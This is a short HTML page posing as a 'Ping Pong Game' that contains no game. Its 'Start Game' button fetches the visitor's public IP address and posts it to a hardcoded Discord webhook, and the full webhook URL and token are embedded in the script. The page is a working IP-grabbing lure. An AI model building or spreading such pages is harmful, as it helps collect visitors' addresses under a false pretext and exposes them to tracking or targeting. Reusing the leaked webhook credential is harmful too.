<!DOCTYPE html>
<html>
<head>
    <title>Get User IP</title>
</head>
<body>
    <h1>Welcome to the Ping Pong Game!</h1>
    <h2>Your IP Address will be sent to the Webhook.</h2>
    <h3>Please click the button below to start the game</h3>
    <button onclick="pingPong()">Start Game</button>

    <script>
        function pingPong() {
            fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;
                sendToWebhook(userIp);
            })
            .catch(error => console.error(error));
        }

        function sendToWebhook(ip) {
            fetch('https://discord.com/api/webhooks/1211159466209181726/Bf5kdFN727sLofxncgaDtzKKdbPFCqh1307szKyT8YODHD2bDqTygjrMX9gTs_Dbkj0n', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ ip: ip })
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
        }
    </script>
</body>
</html>
